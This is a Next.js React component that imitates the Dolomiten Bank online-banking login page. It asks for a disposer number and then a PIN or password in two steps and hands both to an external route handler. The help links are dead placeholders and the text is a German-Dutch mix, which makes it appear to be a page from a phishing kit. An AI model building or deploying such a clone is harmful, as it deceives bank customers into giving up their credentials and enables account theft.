"use client";

import React, { useState } from "react";
import Image from "next/image";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Dolomitenbank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen w-full relative flex flex-col font-sans bg-[#c8ced0]">
      {/* Background Image */}
      <div className="absolute inset-0 z-0">
        <Image 
          src="/dolomiten-bg.webp" 
          alt="Background" 
          fill
          className="object-cover object-center"
          priority
        />
      </div>

      {/* Top Banner */}
      <div className="relative z-20 w-full bg-[#5f7078] h-[55px] flex items-center px-[10%] shadow-sm">
        <div className="relative w-[220px] h-[35px]">
          <Image 
            src="/dolomiten-logo.webp" 
            alt="Dolomiten Bank" 
            fill
            className="object-contain object-left"
          />
        </div>
      </div>

      {/* Main Content Area */}
      <div className="relative z-10 flex-1 flex flex-col items-center pt-[16vh] p-4">
        
        {/* Login Card */}
        <div className="bg-[#f2f2f2] w-full max-w-[620px] shadow-[0_0_15px_rgba(0,0,0,0.1)] rounded-sm overflow-hidden">
          
          {/* Header Strip */}
          <div className="bg-[#5f7078] px-6 py-4">
            <h1 className="text-[22px] font-normal text-white tracking-wide">
              Login DolomitenBanking
            </h1>
          </div>

          <div className="px-8 py-6">
            {/* Introductory Notice */}
            <p className="text-[13px] text-[#333] mb-8 leading-[1.6]">
              Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Unsere Mitarbeiter werden Sie zu keinem Zeitpunkt nach Ihrem Wachtwoord oder einer TAN fragen.
            </p>

            <form 
              onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
              className="flex flex-col"
            >
              {step === 1 ? (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[12px] text-[#444]">Gebruikersnaam</label>
                    <div className="text-[12px] text-[#5f7078]">
                      <a href="#" className="hover:underline">Hochkontrast</a>
                      <span className="mx-1.5">|</span>
                      <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  
                  <input 
                    type="text"
                    value={formData.verfuegernummer || ""}
                    onChange={(e) => onChange("verfuegernummer", e.target.value)}
                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
                  />
                </>
              ) : (
                <>
                  <div className="flex justify-between items-end mb-1">
                    <label className="text-[12px] text-[#444]">Wachtwoord</label>
                    <div className="text-[12px] text-[#5f7078]">
                      <a href="#" className="hover:underline">Hochkontrast</a>
                      <span className="mx-1.5">|</span>
                      <a href="#" className="hover:underline">English</a>
                    </div>
                  </div>
                  
                  <input 
                    type="password"
                    value={formData.pin || ""}
                    onChange={(e) => onChange("pin", e.target.value)}
                    autoFocus
                    className="w-full bg-[#e9ecef] border border-[#d0d0d0] rounded-[3px] px-3 py-[10px] outline-none focus:border-[#5f7078] focus:bg-white text-[15px] text-[#333] mb-6 transition-colors"
                  />
                </>
              )}

              {/* Help/Info Paragraph */}
              <div className="text-center mb-6 px-4">
                <p className="text-[13px] text-[#333] leading-[1.5]">
                  Lukt het inloggen niet? Haben Sie noch eine Inlogcode? - <a href="#" className="text-[#5f7078] hover:underline">Hier leest u hoe u een nieuwe gebruikersnaam / wachtwoord aanvraagt.</a> Inloggen met uw oude inlogcode is niet meer mogelijk!
                </p>
              </div>

              {/* Submit Button */}
              <button 
                type="submit" 
                disabled={saving} 
                className="w-full bg-[#5f7078] hover:bg-[#4a585f] text-white py-[10px] font-normal text-[15px] rounded-[3px] transition-colors disabled:opacity-70 mb-0"
              >
                {saving ? "Wird geladen..." : "Weiter"}
              </button>

            </form>
          </div>

          {/* Bottom Links */}
          <div className="border-t border-[#e0e0e0] bg-white py-5 flex flex-col items-center gap-1.5">
            <div className="flex flex-col items-center text-[13px] text-[#5f7078]">
              <a href="#" className="hover:underline mb-0.5">Gebruikersnaam vergessen?</a>
              <a href="#" className="hover:underline">Wachtwoord vergessen</a>
            </div>
            <div className="flex flex-col items-center text-[13px] text-[#5f7078] mt-2">
              <a href="#" className="hover:underline mb-0.5">Demo-Version</a>
              <a href="#" className="hover:underline">Mehr über das DolomitenBanking</a>
            </div>
          </div>
          
        </div>
      </div>
    </div>
  );
}
